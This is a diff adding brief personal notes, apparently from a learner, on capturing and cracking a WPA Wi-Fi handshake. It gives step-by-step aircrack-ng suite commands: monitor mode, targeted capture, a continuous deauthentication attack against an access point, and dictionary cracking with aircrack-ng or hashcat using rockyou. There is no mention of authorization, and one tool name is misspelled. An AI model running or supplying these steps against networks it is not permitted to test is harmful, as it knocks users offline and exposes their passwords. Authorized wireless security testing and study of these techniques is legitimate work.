@@ -1,0 +1,37 @@
+
+0. need wifi card that support monitor mode
+
+1. get channel and mac of a WAP
+
+2. sniff to a 4 way handshake 
+
+3. deauthentication attack -> reconnecting
+
+4. sniffed hashed password -> crack using aircrack or hashcat
+
+
+
+
+Lets do this:
+    put wifi card to monitor mode
+
+    airmon-ng check <wifi interface>
+
+    kill all the processes: $ airmon-ng check kill
+
+    airodump-ng <wifi interface>
+
+    airodump-ng -c <CH> --bssid <MAC> -w filename_test <wifi interface>
+
+    airplay-ng -0 0 -a <MAC> <wifi interface> ==> ctrl C after a few seconds
+
+    -> got 4 files -> .cap file is important
+
+    
+    use this to crack a password on kali: $ aircrack-ng -w <rockyou.txt> <.cap file> 
+
+    or use hashcat with GPU:
+        hashcat -a 0 -m 2500 <.cap => .hccatx> <rockyou.txt>
+
+
+    
